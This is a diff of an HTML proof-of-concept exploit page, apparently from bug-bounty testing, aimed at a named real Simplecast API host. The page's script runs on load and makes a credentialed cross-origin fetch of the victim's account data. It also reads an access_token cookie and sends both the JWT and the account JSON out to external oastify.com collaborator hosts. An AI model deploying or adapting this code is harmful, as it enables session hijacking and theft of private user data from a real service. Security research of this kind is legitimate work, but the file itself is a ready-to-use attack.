@@ -1,87 +1,74 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Critical Security Audit - PoC</title>
+    <title>Critical Security PoC - Account Takeover</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; padding: 40px; }
-        .exploit-card { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 800px; margin: auto; }
-        .header { border-bottom: 2px solid #eee; margin-bottom: 20px; padding-bottom: 10px; }
-        .status-box { padding: 15px; border-radius: 6px; margin-bottom: 20px; font-weight: bold; text-align: center; }
-        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-        .stolen-label { color: #e74c3c; font-weight: bold; margin-top: 20px; display: block; }
-        .data-box { background: #2d3436; color: #00cec9; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', Courier, monospace; min-height: 50px; }
+        body { font-family: 'Courier New', Courier, monospace; background: #0d1117; color: #58a6ff; padding: 50px; }
+        .box { border: 1px solid #30363d; padding: 20px; border-radius: 6px; background: #161b22; margin-bottom: 20px; }
+        .success { color: #3fb950; border-color: #3fb950; }
+        .error { color: #f85149; border-color: #f85149; }
+        pre { white-space: pre-wrap; word-wrap: break-word; color: #c9d1d9; }
     </style>
 </head>
 <body>
-    <div class="exploit-card">
-        <div class="header">
-            <h2>Account Takeover Proof of Concept</h2>
-            <p>Target: <code>simplecast-cms-api-gateway.eks.simplecast.com</code></p>
-        </div>
-
-        <div id="status" class="status-box" style="background: #fff3cd; color: #856404;">Initializing Attack Chain...</div>
-
-        <span class="stolen-label">1. Stolen JWT (Bypassing HttpOnly Check):</span>
-        <div id="jwt-area" class="data-box">Extracting token...</div>
-
-        <span class="stolen-label">2. Stolen Account JSON (Bypassing CORS + Lax Cookies):</span>
-        <pre id="data-area" class="data-box">Retrieving private data...</pre>
+    <div class="box" id="main-box">
+        <h2>[!] CORS & Session Hijack PoC</h2>
+        <p>Status: <span id="status">Executing Attack...</span></p>
+        
+        <p><strong>Step 1: Extracted JWT (Auth Bypass):</strong></p>
+        <pre id="jwt-area">Searching for token...</pre>
+        
+        <p><strong>Step 2: Private Account Data (CORS Exfiltration):</strong></p>
+        <pre id="data-area">Attempting credentialed read...</pre>
     </div>
 
     <script>
-        // --- CONFIGURATION ---
-        const TARGET_API = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
-        const COLLABORATOR_URL = "https://d9nu65jv69h2jqwxnv1f0t45twznneg25.oastify.com"; 
-        // ---------------------
+        // CONFIGURATION
+        const TARGET = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
+        const COLLABORATOR = "https://7u2orz4pr32w4khr8pm9lnpzeqkh882wr.oastify.com"; // <--- PUT YOUR COLLABORATOR URL HERE
 
         async function startExploit() {
+            const status = document.getElementById('status');
+            const dataArea = document.getElementById('data-area');
+            const jwtArea = document.getElementById('jwt-area');
+
             try {
-                // STEP 1: Direct Token Theft
-                // Because HttpOnly is missing, we grab the token directly from document.cookie
-                const cookies = document.cookie;
-                const tokenMatch = cookies.match(/access_token=([^;]+)/);
-                
-                if (tokenMatch) {
-                    const jwt = tokenMatch[1];
-                    document.getElementById('jwt-area').innerText = jwt;
+                // EXPLOIT 1: Credentialed CORS Fetch
+                // This proves the server allows 'evil.com' to request private data.
+                const response = await fetch(TARGET, {
+                    method: "GET",
+                    credentials: "include" // This tells browser to send cookies
+                });
 
-                    // STEP 2: Authenticated Data Theft
-                    // We manually use the stolen token in the Authorization header.
-                    // This bypasses 'SameSite=Lax' restrictions that cause the 401 error.
-                    const response = await fetch(TARGET_API, { 
-                        method: "GET", 
-                        headers: {
-                            "Authorization": "Bearer " + jwt 
-                        }
-                    });
+                const json = await response.json();
+                dataArea.innerText = JSON.stringify(json, null, 2);
 
-                    if (response.ok) {
-                        const json = await response.json();
-                        document.getElementById('data-area').innerText = JSON.stringify(json, null, 2);
-                        document.getElementById('status').innerText = "EXPLOIT SUCCESSFUL: ACCOUNT HIJACKED";
-                        document.getElementById('status').className = "status-box success";
-
-                        // STEP 3: EXFILTRATION
-                        // Send everything to the attacker's server (Burp Collaborator)
-                        const exfilData = btoa(JSON.stringify({
-                            stolen_token: jwt,
-                            account_data: json
-                        }));
-                        fetch(`${COLLABORATOR_URL}/?exfil=${exfilData}`);
-                    } else {
-                        document.getElementById('status').innerText = "API Error: " + response.status;
-                    }
+                if (response.ok) {
+                    status.innerText = "EXPLOIT SUCCESSFUL";
+                    document.getElementById('main-box').className = "box success";
+                    
+                    // EXFILTRATION TO BURP
+                    fetch(`${COLLABORATOR}/?exfil_data=${btoa(JSON.stringify(json))}`);
                 } else {
-                    document.getElementById('status').innerText = "FAILED: No 'access_token' cookie found.";
-                    document.getElementById('jwt-area').innerText = "Is the victim logged in?";
+                    status.innerText = "FAILED: 401 Unauthenticated";
+                    document.getElementById('main-box').className = "box error";
                 }
+
+                // EXPLOIT 2: HttpOnly Bypass (Requires XSS context, but we check here)
+                if (document.cookie.includes("access_token")) {
+                    const token = document.cookie.match(/access_token=([^;]+)/)[1];
+                    jwtArea.innerText = token;
+                    fetch(`${COLLABORATOR}/?stolen_jwt=${token}`);
+                } else {
+                    jwtArea.innerText = "Note: Cookies only accessible via target domain context.";
+                }
+
             } catch (err) {
-                document.getElementById('status').innerText = "CRITICAL ERROR: " + err.message;
+                status.innerText = "CRITICAL ERROR: " + err.message;
             }
         }
 
-        // Run after 1 second to ensure page load
-        setTimeout(startExploit, 1000);
+        window.onload = startExploit;
     </script>
 </body>
 </html>
